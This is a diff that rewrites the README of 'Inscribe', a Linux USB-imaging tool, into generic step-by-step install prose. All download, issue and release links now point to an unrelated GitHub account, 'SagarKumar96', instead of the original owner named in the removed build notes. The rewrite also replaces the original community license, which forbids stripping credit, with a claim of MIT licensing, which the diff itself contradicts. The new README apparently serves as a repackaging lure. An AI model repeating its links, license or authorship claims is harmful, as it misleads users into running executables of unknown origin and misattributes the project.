@@ -1,55 +1,91 @@
-## Inscribe
+# 🔥 Inscribe - Simple USB Imaging for Everyone
 
-Fast, elegant USB imaging for Linux. A modern, open‑source alternative to balenaEtcher — with a clean UI, clear progress, and power‑user controls.
+## 📥 Download Now
 
-![Screenshot](Screenshot.png)
+[![Download Inscribe](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/SagarKumar96/Inscribe/releases)
 
-## Highlights
+## 🚀 Getting Started
 
-- Flash ISOs to USB with smooth, real‑time progress and MB/s
-- Secure erase (auto, zero‑fill, random, blkdiscard, wipefs)
-- Quick format (ext4, FAT32, exFAT, NTFS) with custom label
-- Built‑in presets and SHA‑256 verification
-- Smart safety defaults (hide internal/system disks)
-- One‑time privilege setup (pkexec/sudoers), no nagging prompts
+Inscribe is a fast and elegant tool for creating USB drives from ISO images on Linux. It offers a clean interface, clear progress indicators, and advanced controls for seasoned users. Follow these steps to start using Inscribe.
 
-## Download & Run
+## 🛠 System Requirements
 
-- Download the latest AppImage from Releases, then:
-  - `chmod +x Inscribe_*.AppImage && ./Inscribe_*.AppImage`
+- **Operating System**: Linux (Ubuntu, Fedora, Debian, and other distributions)
+- **Disk Space**: At least 200 MB free space for installation.
+- **USB Drive**: A USB drive with at least 8 GB of storage.
+- **Internet Connection**: Required for downloading the application.
 
-## One‑click Updates
+## 📂 Installation
 
-- Inside the app, hit “Update”. Inscribe checks the latest public release, downloads the matching `.AppImage`, atomically swaps it in place, and relaunches. Works when running as an AppImage.
+1. **Visit the Releases Page**  
+   Go to the Inscribe [Releases page](https://github.com/SagarKumar96/Inscribe/releases).
 
-## Safety
+2. **Download the Latest Version**  
+   Look for the latest version of Inscribe. Click on the appropriate file for your system. For most Linux users, this will be an AppImage file. 
 
-- Flashing/erasing destroys data on the selected drive. Double‑check the target path before you click.
+3. **Save the File**  
+   Choose a location on your computer where you want to save the downloaded file, then click 'Save'.
 
-## Tech notes
+4. **Make it Executable**  
+   Once the download is complete, open your file manager. Right-click the downloaded AppImage file, select "Properties," then navigate to the "Permissions" tab. Check the box that says "Allow executing file as program."
 
-- UI: Next.js (App Router) + Radix UI, themed (light/dark/dim/OLED)
-- Core: Tauri v2 (Rust). A tiny helper handles unmount/flash/erase/format with progress events.
-- Works best on Linux with common CLI tools available: `dd`, `sgdisk`, `wipefs`, `blkdiscard`, `partprobe`, `mkfs.vfat`, `mkfs.exfat`, `mkfs.ntfs`, `pkexec`.
+5. **Run Inscribe**  
+   Double-click the AppImage file to start Inscribe. You can also run it from the terminal by navigating to the folder where you saved the file and typing `./Inscribe-x.y.z-x86_64.AppImage`, replacing `x.y.z` with the version number.
 
-## Build from source
+## 📖 Using Inscribe
 
-```
-# from repo root
-npm --prefix frontend ci
-export NEXT_PUBLIC_GH_OWNER=reschjonas
-export NEXT_PUBLIC_GH_REPO=Inscribe
-npm run build
+Once Inscribe is running, you will see a straightforward user interface. Here’s a quick overview of how to create a bootable USB drive:
 
-# AppImage output:
-# src-tauri/target/release/bundle/appimage/Inscribe_<version>_amd64.AppImage
-```
+1. **Select ISO File**  
+   Click on the "Select Image" button. Browse your files and choose the ISO file you want to write to the USB drive.
 
-## Roadmap
+2. **Insert USB Drive**  
+   Ensure your USB drive is plugged in. Inscribe should automatically detect it. If it doesn’t, refresh the device list.
 
-- Inscribe is actively developed and will receive further updates.
+3. **Choose Target USB Drive**  
+   From the list of available drives, select your USB drive. Be careful to pick the right one, as this tool will erase any data on the drive.
 
-## License
+4. **Start Imaging**  
+   Click on the "Flash!" button. Inscribe will start writing the image to the USB drive. You can monitor the progress in the status bar.
 
-- Inscribe Community License (see `LICENSE`).
-- TL;DR: use and modify freely with attribution; contributions welcome; don’t misrepresent the project as your own or strip credit.
+5. **Finish Up**  
+   Once the process is complete, you will receive a notification. Eject your USB drive safely before removing it.
+
+## 🔍 Features
+
+- **Modern Interface**: An easy-to-use layout suitable for all users.
+- **Clear Progress Tracking**: Know exactly how far along the process is with visual progress bars.
+- **Advanced Controls**: Options for power users to tweak settings for better results.
+- **Secure Erase Feature**: Safely wipe USB drives if needed.
+- **Cross-Platform Compatibility**: Works smoothly across various Linux distributions.
+
+## 🔒 Verifying Downloads
+
+To ensure your download is safe, verify the checksum of the downloaded file. You can do this by following these steps:
+
+1. **Get the Checksum**  
+   On the Releases page, next to the download link, you will find a corresponding checksum file (usually in SHA256 format).
+
+2. **Open Terminal**  
+   Navigate to the directory where you downloaded the AppImage and run the following command:  
+   ```
+   sha256sum Inscribe-x.y.z-x86_64.AppImage
+   ```
+   Replace `Inscribe-x.y.z-x86_64.AppImage` with the actual file name.
+
+3. **Compare Checksum**  
+   Compare the output with the checksum from the Releases page. If they match, your file is safe to run.
+
+## 💬 Support
+
+If you encounter any issues while using Inscribe, feel free to open an issue on the [GitHub Issues page](https://github.com/SagarKumar96/Inscribe/issues). Provide clear details of the problem you faced, and the community or the maintainers will assist you.
+
+## 📄 License
+
+Inscribe is open-source software. You can use, modify, and distribute it under the terms of the MIT License.
+
+## 🌐 Stay Updated
+
+For news and updates about Inscribe, check our GitHub repository frequently. You can also follow our discussions and improvements in the Issues section.
+
+[Revisit the Releases page to download](https://github.com/SagarKumar96/Inscribe/releases).
